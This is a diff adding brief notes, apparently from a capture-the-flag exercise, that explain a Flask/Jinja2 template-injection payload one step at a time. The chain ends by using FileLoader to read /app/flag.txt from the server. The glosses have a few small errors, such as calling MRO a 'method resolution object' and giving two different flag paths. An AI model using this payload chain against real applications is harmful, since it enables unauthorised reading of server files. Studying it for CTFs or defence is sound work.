@@ -1,0 +1,12 @@
+FLASK:
+
+{{ config }} - this is an object which Flask export to templates, containing the current instance configuration.
+{{ config.items() }} - because config is a key-value dict, we just take the values.
+{{ config.items()[4] }} - just take some random item from the configuration (which derives from object).
+{{ config.items()[4].__class__ }} - the class of the object (in our case - <class 'jinja2.runtime.Undefined'>).
+{{ config.items()[4].__class__.__mro__ }} - the MRO (method resolution object) of the class. This is basically an iterator of all superclasses of the class.
+{{ config.items()[4].__class__.__mro__[1] }} - we just took the last class in the MRO - this is just <class 'object'>.
+{{ config.items()[4].__class__.__mro__[1].__subclasses__() }} - these are all the available subclasses of the class object (which obviously should be all available classes).
+{{ config.items()[4].__class__.__mro__[1].__subclasses__()[99] }} - this is the class <class '_frozen_importlib_external.FileLoader'>'. We will abuse it in order to read the content of a file on the filesystem.
+{{ config.items()[4].__class__.__mro__[1].__subclasses__()[99]("/app/flag.txt", "/app/flag.txt") }}- this is a construction of an instance of the FileLoader object (the two parameters doesn't really seem to matter - but them as the flag path just in case).
+{{ config.items()[4].__class__.__mro__[1].__subclasses__()[99]("/app/flag.txt", "/app/flag.txt").get_data("/app/flag.txt") }} - this calls the get_data method of the FileLoader object we created, in order to read the data from the flag file (located in /flag on the server machine).
